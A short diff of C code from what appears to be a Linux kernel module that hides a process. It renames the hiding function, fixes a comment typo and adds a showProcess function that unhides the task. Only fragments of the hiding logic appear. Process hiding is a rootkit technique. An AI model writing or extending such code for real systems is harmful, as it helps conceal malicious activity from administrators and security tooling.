@@ -24,9 +24,8 @@ struct restorableHiddenTask { //TODO: rename this
 
 struct restorableHiddenTask onlyHiddenTask = {NULL};
 
-// Function Prototyps
-int hideProcess(int pidNumber);
-static struct restorableHiddenTask hideProcessGivenRcuLockIsHeldAndReturnRestorableHiddenTask(struct pid *pid);
+// Function Prototypes
+static struct restorableHiddenTask hideProcessGivenRcuLockIsHeld(struct pid *pid);
 static int notificationFunctionOnTaskExit(struct notifier_block *notifierBlock, unsigned long unknownLong, void *task);
 static int isTaskHidden(void *task);
 static void restoreTaskGivenRcuLockIsHeld(struct restorableHiddenTask *taskToRestore);
@@ -98,7 +97,7 @@ int hideProcess(int pidNumber) {
 		return -1;
 	}
 
-	onlyHiddenTask = hideProcessGivenRcuLockIsHeldAndReturnRestorableHiddenTask(pid);
+	onlyHiddenTask = hideProcessGivenRcuLockIsHeld(pid);
 	if (onlyHiddenTask.task == NULL) {
 		printError("failed to hide task\n");
 	}
@@ -108,8 +107,19 @@ int hideProcess(int pidNumber) {
 	return 0;
 }
 
+int showProcess(int pid) {
+	rcu_read_lock();
 
-static struct restorableHiddenTask hideProcessGivenRcuLockIsHeldAndReturnRestorableHiddenTask(struct pid *pid) {
+	// unhide hidden tasks
+	if (onlyHiddenTask.task != NULL) { // is a task still hidden..
+		restoreTaskGivenRcuLockIsHeld(&onlyHiddenTask);
+	}
+
+	rcu_read_unlock();
+	return 0;
+}
+
+static struct restorableHiddenTask hideProcessGivenRcuLockIsHeld(struct pid *pid) {
 	struct task_struct *task = pid_task(pid, PIDTYPE_PID);
 	struct pid *originalPid;
 
